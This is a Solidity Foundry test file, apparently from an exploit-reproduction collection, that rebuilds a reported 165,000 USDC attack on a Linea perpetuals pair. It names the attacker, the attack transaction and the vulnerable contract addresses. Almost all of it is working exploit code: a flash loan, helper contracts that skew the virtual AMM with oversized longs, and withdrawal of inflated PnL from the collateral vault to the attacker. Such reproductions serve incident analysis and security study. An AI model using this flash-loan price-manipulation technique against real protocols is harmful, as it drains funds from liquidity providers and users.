// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 165647.74 USDC
// Attacker : 0x8d6778d7fae00ad2e0bc12194cf03b756fed9db3
// Attack Contract : 0xb87275489272ce1c4be358fc5856ea3273093cf8
// Vulnerable Contract : 0xb68396dd4230253d27589e2004ac37389836ae17
// Attack Tx : https://lineascan.build/tx/0xcb0744a0d453e5556f162608fae8275dabd14292bffbfcd8394af4610c606447

// @Info
// Vulnerable Contract Code : https://lineascan.build/address/0xb68396dd4230253d27589e2004ac37389836ae17#code
// CurveMath Code : https://lineascan.build/address/0x78197fe93999e34d5a688e1819923c66dcf8f4db#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2041070927908126897
//
// The attacker used a 60,000 USDC Aave flash loan to seed two fresh LP/trader helper pairs.
// Each LP helper added PerpPair liquidity, each trader helper opened an oversized long that skewed
// the virtual AMM, and the LP helper immediately realized inflated PnL and withdrew it from the vault.

address constant ATTACKER = 0x8D6778d7FAe00aD2e0bc12194cF03B756FED9Db3;
address constant AAVE_POOL = 0xc47b8C00b0f69a36fa203Ffeac0334874574a8Ac;
address constant LINEA_USDC = 0x176211869cA2b568f2A7D4EE941E073a821EE1ff;
address constant COLLATERAL_VAULT = 0x61cE9B51010BA52F701444f0F3D1e563F6ae8d91;
address constant PERP_PAIR = 0xB68396dD4230253d27589e2004Ac37389836AE17;

interface IPerpCollateralVault {
    function addCollateral(
        uint256[] calldata amounts
    ) external;
    function removeCollateral(
        uint256 amount,
        bytes calldata unverifiedReport
    ) external;
    function totalCollateral() external view returns (uint256);
    function userCollateral(
        address user
    ) external view returns (uint256);
}

interface IPerpPair {
    function addLiquidity(
        uint256 liquidityStable,
        uint256 liquidityAsset,
        uint256 maxFeeValue,
        bytes calldata unverifiedReport
    ) external;
    function trade(
        bool direction,
        uint256 size,
        uint256 minTradeReturn,
        uint256 initialGuess,
        address frontendAddress,
        uint8 leverage,
        bytes calldata unverifiedReport
    ) external returns (uint256);
    function realizePnL(
        bytes calldata unverifiedReport
    ) external returns (uint256 pnl, bool pnlSign);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 30_067_820;
        vm.createSelectFork("linea", forkBlock);
        vm.roll(30_067_821);
        vm.warp(1_775_380_033);
        fundingToken = LINEA_USDC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(AAVE_POOL, "Aave V3 Pool");
        vm.label(LINEA_USDC, "USDC");
        vm.label(COLLATERAL_VAULT, "Perp collateral vault");
        vm.label(PERP_PAIR, "PerpPair");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = IERC20(LINEA_USDC).balanceOf(ATTACKER);
        PerpPairAttackCoordinator coordinator = new PerpPairAttackCoordinator(ATTACKER);

        vm.prank(ATTACKER);
        coordinator.run();

        uint256 profit = IERC20(LINEA_USDC).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        assertGt(profit, 165_000e6, "rebuilt PerpPair exploit profit below expected range");
    }
}

contract PerpPairAttackCoordinator {
    IERC20 private constant usdc = IERC20(LINEA_USDC);
    IAaveFlashloan private constant aave = IAaveFlashloan(AAVE_POOL);

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function run() external {
        require(msg.sender == profitReceiver, "only profit receiver");

        // step 1: borrow the same USDC amount from Aave as the traced attack contract.
        aave.flashLoanSimple(address(this), LINEA_USDC, 60_000e6, "", 0);

        // step 8: Aave has pulled repayment; forward remaining USDC to the attacker EOA.
        uint256 profit = usdc.balanceOf(address(this));
        require(profit > 0, "no USDC profit");
        usdc.transfer(profitReceiver, profit);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL, "not Aave pool");
        require(initiator == address(this), "bad initiator");
        require(asset == LINEA_USDC && amount == 60_000e6, "unexpected flash loan");

        // step 2: deploy the first LP/trader pair and seed them with 30,000 and 15,000 USDC.
        PerpLpHelper firstLp = new PerpLpHelper(address(this));
        PerpTraderHelper firstTrader = new PerpTraderHelper(address(this));
        usdc.transfer(address(firstLp), 30_000e6);
        usdc.transfer(address(firstTrader), 15_000e6);

        // step 3: add 20,000 virtual stable liquidity, then skew the AMM with a 100,000 size long.
        firstLp.addLiquidityRound(30_000e6, 20_000e18);
        firstTrader.tradeRound(15_000e6, 100_000e18);

        // step 4: realize the manipulated LP PnL, withdraw available vault collateral, and collect it.
        firstLp.realizeAndWithdraw();
        firstLp.sweep(address(this));

        // step 5: repeat with a smaller second LP/trader pair while the AMM state is still distorted.
        PerpLpHelper secondLp = new PerpLpHelper(address(this));
        PerpTraderHelper secondTrader = new PerpTraderHelper(address(this));
        usdc.transfer(address(secondLp), 10_000e6);
        usdc.transfer(address(secondTrader), 5000e6);
        secondLp.addLiquidityRound(10_000e6, 8000e18);
        secondTrader.tradeRound(5000e6, 30_000e18);

        // step 6: realize the second inflated LP PnL and collect the remaining available vault collateral.
        secondLp.realizeAndWithdraw();
        secondLp.sweep(address(this));

        // step 7: approve Aave to pull principal plus the traced 30 USDC premium.
        uint256 repayment = amount + premium;
        require(repayment == 60_030e6, "unexpected Aave premium");
        usdc.approve(AAVE_POOL, repayment);
        return true;
    }
}

contract PerpLpHelper {
    IERC20 private constant usdc = IERC20(LINEA_USDC);
    IPerpCollateralVault private constant vault = IPerpCollateralVault(COLLATERAL_VAULT);
    IPerpPair private constant pair = IPerpPair(PERP_PAIR);

    address private immutable owner;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function addLiquidityRound(
        uint256 collateralAmount,
        uint256 liquidityStable
    ) external onlyOwner {
        usdc.approve(COLLATERAL_VAULT, collateralAmount);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = collateralAmount;
        vault.addCollateral(amounts);

        pair.addLiquidity(liquidityStable, 0, 0, "");
    }

    function realizeAndWithdraw() external onlyOwner returns (uint256 pnl) {
        bool pnlSign;
        (pnl, pnlSign) = pair.realizePnL("");
        require(pnlSign, "expected positive PnL");

        uint256 userCollateral = vault.userCollateral(address(this));
        uint256 availableCollateral = vault.totalCollateral();
        uint256 withdrawAmount = pnl;
        // The second round realizes more PnL than the vault can still pay.
        if (withdrawAmount > userCollateral) withdrawAmount = userCollateral;
        if (withdrawAmount > availableCollateral) withdrawAmount = availableCollateral;
        vault.removeCollateral(withdrawAmount, "");
    }

    function sweep(
        address to
    ) external onlyOwner {
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            usdc.transfer(to, balance);
        }
    }
}

contract PerpTraderHelper {
    IERC20 private constant usdc = IERC20(LINEA_USDC);
    IPerpCollateralVault private constant vault = IPerpCollateralVault(COLLATERAL_VAULT);
    IPerpPair private constant pair = IPerpPair(PERP_PAIR);

    address private immutable owner;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function tradeRound(
        uint256 collateralAmount,
        uint256 tradeSize
    ) external onlyOwner {
        usdc.approve(COLLATERAL_VAULT, collateralAmount);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = collateralAmount;
        vault.addCollateral(amounts);

        pair.trade(true, tradeSize, 0, 0, address(0), 10, "");
    }
}
